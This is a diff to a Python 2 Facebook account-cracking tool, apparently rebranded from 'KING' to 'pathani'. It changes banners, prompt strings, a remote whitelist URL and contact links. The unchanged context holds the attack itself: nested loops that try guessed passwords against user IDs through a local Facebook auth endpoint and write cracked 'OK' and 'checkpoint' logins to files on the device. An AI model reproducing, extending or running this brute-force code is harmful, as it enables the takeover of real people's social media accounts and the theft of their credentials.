@@ -31,8 +31,13 @@ header = {'x-fb-connection-bandwidth': repr(bd),
    'x-fb-http-engine': 'Liger'}
 os.system('git pull')
 os.system('clear')
-logo = '\n\x1b[1;92mWelcome My Tool                       \n\x1b[1;92m\xe2\x9e\xa3        {} {} {} {}{}{} {}{}{}\N\x1b[1;93m\xe2\x9e\xa3        {} {} {}  {}    {}\n\x1b[1;94m\xe2\x9e\xa3         {} {} {}   {}    {}\n\x1b[1;96m\xe2\x9e\xa3         {} {} {}   {}    {}\n\x1b[1;97m\xe2\x9e\xa3         {} {} {}  {}    {}    {}\n\x1b[1;96m\xe2\x9e\xa3       {}{}   {}    {} .   {}\n\x1b[1;96m                \n\x1b[1;96m                      \n\x1b[1;92m         AK BRAND            \n\x1b[1;91m-----------------------------------------------\n\x1b[1;97m\xe2\x9e\xa3 Author : KING x QUEEN\n\x1b[1;97m\xe2\x9e\xa3 Github : https://github.com/AK-KiNg-60\n\x1b[1;97m\xe2\x9e\xa3 WP NO: +923133828778\n\x1b[1;91m-----------------------------------------------'
-
+logo = """
+\033[1;91m╭━━━╮╱╱╭╮╭╮
+\033[1;92m┃╭━╮┃╱╭╯╰┫┃
+\033[1;93m┃╰━╯┣━┻╮╭┫╰━┳━━┳━╮╭╮
+\033[1;94m┃╭━━┫╭╮┃┃┃╭╮┃╭╮┃╭╮╋┫
+\033[1;95m┃┃╱╱┃╭╮┃╰┫┃┃┃╭╮┃┃┃┃┃
+\033[1;96m╰╯╱╱╰╯╰┻━┻╯╰┻╯╰┻╯╰┻╯
 def reg():
     os.system('clear')
     print logo
@@ -45,7 +50,7 @@ def reg():
     except (KeyError, IOError):
         reg2()
 
-    r = requests.get('https://raw.githubusercontent.com/AK-KiNg-60/kingbaba/main/server.txt').text
+    r = requests.get('https://raw.githubusercontent.com/muskanpathani/pathani/main/server.txt').text
     if to in r:
         os.system('cd ..... && npm install')
         os.system('fuser -k 5000/tcp &')
@@ -61,7 +66,7 @@ def reg():
         print ' \x1b[1;92mCopy the id and send to admin'
         print ' \x1b[1;92mYour id: ' + to
         raw_input('\x1b[1;93m Press enter to send id')
-        os.system('xdg-open https://wa.me/+923007574310')
+        os.system('xdg-open https://www.facebook.com/xtylish.pathani.2021')
         reg()
 
 
@@ -74,7 +79,7 @@ def reg2():
     print ' Your id: ' + id
     print ''
     raw_input(' Press enter to go to whatsapp ')
-    os.system('xdg-open https://wa.me/+923007574310')
+    os.system('xdg-open https://www.facebook.com/xtylish.pathani.2021')
     sav = open('/sdcard/.hst.txt', 'w')
     sav.write(id)
     sav.close()
@@ -126,7 +131,7 @@ def log_menu():
 
 
 def log_menu_s():
-    s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Jutt\xe2\x9e\xa4 ')
+    s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80╰─pathani➤\xe2\x9e\xa4 ')
     if s == '1':
         log_fb()
     elif s == '2':
@@ -275,7 +280,7 @@ def menu():
 
 
 def menu_s():
-    ms = raw_input('\x1b[1;97m\xe2\x95\xb0\xe2\x94\x80jutt\xe2\x9e\xa4 ')
+    ms = raw_input('\x1b[1;97m\xe2\x95\xb0\xe2\x94\x80╰─pathani➤\xe2\x9e\xa4 ')
     if ms == '1':
         auto_crack()
     elif ms == '2':
@@ -283,7 +288,7 @@ def menu_s():
     elif ms == '3':
         name_crack()
     elif ms == '4':
-        os.system('python2 King2.py')
+        os.system('python2 pathani.py')
     elif ms == '5':
         lout()
     elif ms == '6':
@@ -345,7 +350,7 @@ def a_s():
     id = []
     cps = []
     oks = []
-    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80King\xe2\x9e\xa4 ')
+    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80╰─pathani➤\xe2\x9e\xa4 ')
     if a_s == '1':
         os.system('clear')
         print logo
@@ -432,7 +437,7 @@ def a_s():
     print ' \x1b[1;97mCrack Running\x1b[1;91m '
     time.sleep(0.5)
     print 47 * '-'
-    print '\t\x1b[1;94mKing Of Fb Feel\x1b[1;91m'
+    print '\t\x1b[1;94mFb Queen Xtylish Pathani\x1b[1;91m'
     print 47 * '-'
 
     def main(arg):
@@ -443,13 +448,13 @@ def a_s():
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\x1b[1;92m[KING-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print '\x1b[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                 ok = open('/sdcard/ids/KING_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print '\x1b[1;31;1m[QUEEN-CP] ' + uid + ' | ' + pass1
+                print '\x1b[1;31;1m[PATHANI-CP] ' + uid + ' | ' + pass1
                 cp = open('QUEEN_CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
@@ -459,13 +464,13 @@ def a_s():
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\x1b[1;92m[KING-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print '\x1b[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                     ok = open('/sdcard/ids/KING_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print '\x1b[1;31;1m[QUEEN-CP] ' + uid + ' | ' + pass2
+                    print '\x1b[1;31;1m[PATHANI-CP] ' + uid + ' | ' + pass2
                     cp = open('QUEEN_CP.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
@@ -475,13 +480,13 @@ def a_s():
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                     q = json.loads(data)
                     if 'loc' in q:
-                        print '\x1b[1;92m[KING-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        print '\x1b[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                         ok = open('/sdcard/ids/KING_OK.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error']:
-                        print '\x1b[1;31;1m[QUEEN-CP] ' + uid + ' | ' + pass3
+                        print '\x1b[1;31;1m[PATHANI-CP] ' + uid + ' | ' + pass3
                         cp = open('QUEEN_CP.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
@@ -491,13 +496,13 @@ def a_s():
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                         q = json.loads(data)
                         if 'loc' in q:
-                            print '\x1b[1;92m[KING-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            print '\x1b[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                             ok = open('/sdcard/ids/KING_OK.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error']:
-                            print '\x1b[1;31;1m[QUEEN-CP] ' + uid + ' | ' + pass4
+                            print '\x1b[1;31;1m[PATHANI-CP] ' + uid + ' | ' + pass4
                             cp = open('QUEEN_CP.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
@@ -507,13 +512,13 @@ def a_s():
                             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                             q = json.loads(data)
                             if 'loc' in q:
-                                print '\x1b[1;92m[KING-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
+                                print '\x1b[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                 ok = open('/sdcard/ids/KING_OK.txt', 'a')
                                 ok.write(uid + ' | ' + pass5 + '\n')
                                 ok.close()
                                 oks.append(uid + pass5)
                             elif 'www.facebook.com' in q['error']:
-                                print '\x1b[1;31;1m[QUEEN-CP] ' + uid + ' | ' + pass5
+                                print '\x1b[1;31;1m[PATHANI-CP] ' + uid + ' | ' + pass5
                                 cp = open('QUEEN.txt', 'a')
                                 cp.write(uid + ' | ' + pass5 + '\n')
                                 cp.close()
@@ -523,13 +528,13 @@ def a_s():
                                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                 q = json.loads(data)
                                 if 'loc' in q:
-                                    print '\x1b[1;92m[KING-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
+                                    print '\x1b[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                     ok = open('/sdcard/ids/KING_OK.txt', 'a')
                                     ok.write(uid + ' | ' + pass6 + '\n')
                                     ok.close()
                                     oks.append(uid + pass6)
                                 elif 'www.facebook.com' in q['error']:
-                                    print '\x1b[1;31;1m[QUEEN-CP] ' + uid + ' | ' + pass6
+                                    print '\x1b[1;31;1m[PATHANI-CP] ' + uid + ' | ' + pass6
                                     cp = open('QUEEN_CP.txt', 'a')
                                     cp.write(uid + ' | ' + pass6 + '\n')
                                     cp.close()
@@ -539,13 +544,13 @@ def a_s():
                                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                     q = json.loads(data)
                                     if 'loc' in q:
-                                        print '\x1b[1;92m[KING-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
+                                        print '\x1b[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                         ok = open('/sdcard/ids/KING_OK.txt', 'a')
                                         ok.write(uid + ' | ' + pass7 + '\n')
                                         ok.close()
                                         oks.append(uid + pass7)
                                     elif 'www.facebook.com' in q['error']:
-                                        print '\x1b[1;31;1m[QUEEN-CP] ' + uid + ' | ' + pass7
+                                        print '\x1b[1;31;1m[PATHANI-CP] ' + uid + ' | ' + pass7
                                         cp = open('QUEEN_CP.txt', 'a')
                                         cp.write(uid + ' | ' + pass7 + '\n')
                                         cp.close()
@@ -555,13 +560,13 @@ def a_s():
                                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                         q = json.loads(data)
                                         if 'loc' in q:
-                                            print '\x1b[1;92m[KING-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
+                                            print '\x1b[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                             ok = open('/sdcard/ids/KING_OK.txt', 'a')
                                             ok.write(uid + ' | ' + pass8 + '\n')
                                             ok.close()
                                             oks.append(uid + pass8)
                                         elif 'www.facebook.com' in q['error']:
-                                            print '\x1b[1;31;1m[QUEEN-CP] ' + uid + ' | ' + pass8
+                                            print '\x1b[1;31;1m[PATHANI-CP] ' + uid + ' | ' + pass8
                                             cp = open('QUEEN_CP.txt', 'a')
                                             cp.write(uid + ' | ' + pass8 + '\n')
                                             cp.close()
@@ -571,13 +576,13 @@ def a_s():
                                             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers=header).text
                                             q = json.loads(data)
                                             if 'loc' in q:
-                                                print '\x1b[1;92m[KING-OK] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m'
+                                                print '\x1b[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m'
                                                 ok = open('/sdcard/ids/KING_OK.txt', 'a')
                                                 ok.write(uid + ' | ' + pass9 + '\n')
                                                 ok.close()
                                                 oks.append(uid + pass9)
                                             elif 'www.facebook.com' in q['error']:
-                                                print '\x1b[1;31;1m[QUEEN-CP] ' + uid + ' | ' + pass9
+                                                print '\x1b[1;31;1m[PATHANI-CP] ' + uid + ' | ' + pass9
                                                 cp = open('QUEEN_CP.txt', 'a')
                                                 cp.write(uid + ' | ' + pass9 + '\n')
                                                 cp.close()
@@ -587,13 +592,13 @@ def a_s():
                                                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass10, headers=header).text
                                                 q = json.loads(data)
                                                 if 'loc' in q:
-                                                    print '\x1b[1;92m[KING-OK] \x1b[1;32m' + uid + ' | ' + pass10 + '\x1b[0;97m'
+                                                    print '\x1b[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass10 + '\x1b[0;97m'
                                                     ok = open('/sdcard/ids/KING_OK.txt', 'a')
                                                     ok.write(uid + ' | ' + pass10 + '\n')
                                                     ok.close()
                                                     oks.append(uid + pass10)
                                                 elif 'www.facebook.com' in q['error']:
-                                                    print '\x1b[1;31;1m[QUEEN-CP] ' + uid + ' | ' + pass10
+                                                    print '\x1b[1;31;1m[PATHANI-CP] ' + uid + ' | ' + pass10
                                                     cp = open('QUEEN_CP.txt', 'a')
                                                     cp.write(uid + ' | ' + pass10 + '\n')
                                                     cp.close()
@@ -659,7 +664,7 @@ def c_s():
     id = []
     cps = []
     oks = []
-    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80jutt\xe2\x9e\xa4 ')
+    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80╰─pathani➤\xe2\x9e\xa4 ')
     if a_s == '1':
         os.system('clear')
         print logo
@@ -772,14 +777,14 @@ def c_s():
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\x1b[1;92m[KING-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print '\x1b[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                 ok = open('/sdcard/ids/KING_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
                 print '\x1b[1;31;1m[QUEEN-CP] ' + uid + ' | ' + pass1
-                cp = open('QUEEN_CP.txt', 'a')
+                cp = open('PATHANI_CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
                 cps.append(uid + pass1)
@@ -787,13 +792,13 @@ def c_s():
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\x1b[1;92m[KING-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print '\x1b[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                     ok = open('/sdcard/ids/KING_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print '\x1b[1;31;1m[QUEEN-CP] ' + uid + ' | ' + pass2
+                    print '\x1b[1;31;1m[PATHANI-CP] ' + uid + ' | ' + pass2
                     cp = open('QUEEN_CP.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
@@ -802,13 +807,13 @@ def c_s():
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                     q = json.loads(data)
                     if 'loc' in q:
-                        print '\x1b[1;92m[KING-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        print '\x1b[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                         ok = open('/sdcard/ids/KING_OK.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error']:
-                        print '\x1b[1;31;1m[QUEEN-CP] ' + uid + ' | ' + pass3
+                        print '\x1b[1;31;1m[PATHANI-CP] ' + uid + ' | ' + pass3
                         cp = open('QUEEN_CP.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
@@ -817,13 +822,13 @@ def c_s():
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                         q = json.loads(data)
                         if 'loc' in q:
-                            print '\x1b[1;92m[KING-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            print '\x1b[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                             ok = open('/sdcard/ids/KING_OK.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error']:
-                            print '\x1b[1;31;1m[QUEEN-CP] ' + uid + ' | ' + pass4
+                            print '\x1b[1;31;1m[PATHANI-CP] ' + uid + ' | ' + pass4
                             cp = open('QUEEN_CP.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
@@ -832,13 +837,13 @@ def c_s():
                             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                             q = json.loads(data)
                             if 'loc' in q:
-                                print '\x1b[1;92m[KING-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
+                                print '\x1b[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                 ok = open('/sdcard/ids/KING_OK.txt', 'a')
                                 ok.write(uid + ' | ' + pass5 + '\n')
                                 ok.close()
                                 oks.append(uid + pass5)
                             elif 'www.facebook.com' in q['error']:
-                                print '\x1b[1;31;1m[QUEEN-CP] ' + uid + ' | ' + pass5
+                                print '\x1b[1;31;1m[PATHANI-CP] ' + uid + ' | ' + pass5
                                 cp = open('QUEEN_CP.txt', 'a')
                                 cp.write(uid + ' | ' + pass5 + '\n')
                                 cp.close()
@@ -847,13 +852,13 @@ def c_s():
                                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                 q = json.loads(data)
                                 if 'loc' in q:
-                                    print '\x1b[1;92m[KING-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
+                                    print '\x1b[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                     ok = open('/sdcard/ids/KING_OK.txt', 'a')
                                     ok.write(uid + ' | ' + pass6 + '\n')
                                     ok.close()
                                     oks.append(uid + pass6)
                                 elif 'www.facebook.com' in q['error']:
-                                    print '\x1b[1;31;1m[QUEEN-CP] ' + uid + ' | ' + pass6
+                                    print '\x1b[1;31;1m[PATHANI-CP] ' + uid + ' | ' + pass6
                                     cp = open('QUEEN_CP.txt', 'a')
                                     cp.write(uid + ' | ' + pass6 + '\n')
                                     cp.close()
@@ -920,7 +925,7 @@ def n_s():
     id = []
     cps = []
     oks = []
-    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80jutt\xe2\x9e\xa4 ')
+    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80╰─pathani➤\xe2\x9e\xa4 ')
     if a_s == '1':
         os.system('clear')
         print logo
@@ -1038,13 +1043,13 @@ def n_s():
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\x1b[1;92m[KING-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print '\x1b[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                 ok = open('/sdcard/ids/KING_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print '\x1b[1;31;1m[QUEEN-CP] ' + uid + ' | ' + pass1
+                print '\x1b[1;31;1m[PATHANI-CP] ' + uid + ' | ' + pass1
                 cp = open('QUEEN_CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
@@ -1054,13 +1059,13 @@ def n_s():
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\x1b[1;92m[KING-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print '\x1b[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                     ok = open('/sdcard/ids/KING_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print '\x1b[1;31;1m[QUEEN-CP] ' + uid + ' | ' + pass2
+                    print '\x1b[1;31;1m[PATHANI-CP] ' + uid + ' | ' + pass2
                     cp = open('QUEEN_CP.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
@@ -1070,13 +1075,13 @@ def n_s():
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                     q = json.loads(data)
                     if 'loc' in q:
-                        print '\x1b[1;92m[KING-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        print '\x1b[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                         ok = open('/sdcard/ids/QUEEN_OK.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error']:
-                        print '\x1b[1;31;1m[QUEEN-CP] ' + uid + ' | ' + pass3
+                        print '\x1b[1;31;1m[PATHANI-CP] ' + uid + ' | ' + pass3
                         cp = open('QUEEN_CP.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
@@ -1086,13 +1091,13 @@ def n_s():
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                         q = json.loads(data)
                         if 'loc' in q:
-                            print '\x1b[1;92m[KING-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            print '\x1b[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                             ok = open('/sdcard/ids/KING_OK.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error']:
-                            print '\x1b[1;31;1m[QUEEN-CP] ' + uid + ' | ' + pass4
+                            print '\x1b[1;31;1m[PATHANI-CP] ' + uid + ' | ' + pass4
                             cp = open('QUEEN_CP.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
@@ -1101,13 +1106,13 @@ def n_s():
                             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                             q = json.loads(data)
                             if 'loc' in q:
-                                print '\x1b[1;92m[KING-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
+                                print '\x1b[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                 ok = open('/sdcard/ids/KING_OK.txt', 'a')
                                 ok.write(uid + ' | ' + pass5 + '\n')
                                 ok.close()
                                 oks.append(uid + pass5)
                             elif 'www.facebook.com' in q['error']:
-                                print '\x1b[1;31;1m[QUEEN-CP] ' + uid + ' | ' + pass5
+                                print '\x1b[1;31;1m[PATHANI-CP] ' + uid + ' | ' + pass5
                                 cp = open('QUEEN_CP.txt', 'a')
                                 cp.write(uid + ' | ' + pass5 + '\n')
                                 cp.close()
@@ -1116,13 +1121,13 @@ def n_s():
                                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                 q = json.loads(data)
                                 if 'loc' in q:
-                                    print '\x1b[1;92m[KING-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
+                                    print '\x1b[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                     ok = open('/sdcard/ids/KING_OK.txt', 'a')
                                     ok.write(uid + ' | ' + pass6 + '\n')
                                     ok.close()
                                     oks.append(uid + pass6)
                                 elif 'www.facebook.com' in q['error']:
-                                    print '\x1b[1;31;1m[QUEEN-CP] ' + uid + ' | ' + pass6
+                                    print '\x1b[1;31;1m[PATHANI-CP] ' + uid + ' | ' + pass6
                                     cp = open('QUEEN_CP.txt', 'a')
                                     cp.write(uid + ' | ' + pass6 + '\n')
                                     cp.close()
@@ -1131,13 +1136,13 @@ def n_s():
                                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                     q = json.loads(data)
                                     if 'loc' in q:
-                                        print '\x1b[1;92m[KING-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
+                                        print '\x1b[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                         ok = open('/sdcard/ids/KING_OK.txt', 'a')
                                         ok.write(uid + ' | ' + pass7 + '\n')
                                         ok.close()
                                         oks.append(uid + pass7)
                                     elif 'www.facebook.com' in q['error']:
-                                        print '\x1b[1;31;1m[QUEEN-CP] ' + uid + ' | ' + pass7
+                                        print '\x1b[1;31;1m[PATHANI-CP] ' + uid + ' | ' + pass7
                                         cp = open('QUEEN_CP.txt', 'a')
                                         cp.write(uid + ' | ' + pass7 + '\n')
                                         cp.close()
@@ -1146,13 +1151,13 @@ def n_s():
                                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                         q = json.loads(data)
                                         if 'loc' in q:
-                                            print '\x1b[1;92m[KING-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
+                                            print '\x1b[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                             ok = open('/sdcard/ids/KING_OK.txt', 'a')
                                             ok.write(uid + ' | ' + pass8 + '\n')
                                             ok.close()
                                             oks.append(uid + pass8)
                                         elif 'www.facebook.com' in q['error']:
-                                            print '\x1b[1;31;1m[QUEEN-CP] ' + uid + ' | ' + pass8
+                                            print '\x1b[1;31;1m[PATHANI-CP] ' + uid + ' | ' + pass8
                                             cp = open('QUEEN_CP.txt', 'a')
                                             cp.write(uid + ' | ' + pass8 + '\n')
                                             cp.close()
